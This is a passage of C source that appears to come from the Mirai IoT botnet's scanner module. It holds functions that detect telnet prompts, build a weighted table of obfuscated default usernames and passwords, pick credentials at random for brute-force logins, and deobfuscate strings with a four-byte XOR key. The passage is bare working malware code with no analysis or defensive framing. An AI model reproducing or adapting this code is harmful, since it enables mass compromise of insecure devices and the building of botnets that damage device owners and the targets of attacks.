        #ifdef DEBUG
			printf("[scanner] FD%d detected token, moving on!\n", conn->fd);
		#endif
        return prompt_ending;
    }
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);

    if (prompt_ending == -1)
	{
		table_lock_val(TABLE_SCAN_RESP);
		return 0;
	}
    else
	{
        #ifdef DEBUG
			printf("[scanner] FD%d detected '%s', moving on!\n", conn->fd, tkn_resp);
		#endif

		table_lock_val(TABLE_SCAN_RESP);
		return prompt_ending;
	}
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
